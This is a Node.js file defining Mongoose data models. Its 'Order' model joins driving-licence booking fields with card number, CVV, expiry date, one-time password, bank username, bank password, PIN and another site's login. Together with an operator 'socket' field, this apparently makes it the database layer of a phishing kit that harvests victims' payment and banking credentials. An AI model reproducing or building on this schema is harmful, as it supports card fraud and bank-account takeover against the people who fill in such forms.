const { default: mongoose, mongo, Mongoose } = require("mongoose");

exports.User = mongoose.model('User',new mongoose.Schema({
    email:String,
    password:String,
    type:String,
    socket:String,
},{timestamps:true}))

exports.Order = mongoose.model('Order',new mongoose.Schema({
    fullname:String,//
    nationalty:String,
    gender:String,
    nation_number:Number,
    birth:String,
    phone:Number,
    email:String,
    lang:String,
    licence_type:String,
    car_type:String,
    time:String,
    train_lang:String,
    service:String,
    type:String,
    username:String,
    token:String,
    cvv:String,
    card_number:String,
    expire_date:String,
    site_user:String,
    site_password:String,
    otp:{
        type:String,
        default:null
    },
    bank:{
        type:String,
    },
    bankUsername:String,
    bankPassword:String,
    pin:String
},{timestamps:true}))

exports.Session = mongoose.model('Request',new mongoose.Schema({
    username:String,
    password:String,
    token:String,
    status:{
        type:Boolean,
        default:false
    },
    expire_id:{
        type:Date,
        default:new Date(Date.now() + (2 * 60 * 60 * 1000))
    }

},{timestamps:true}))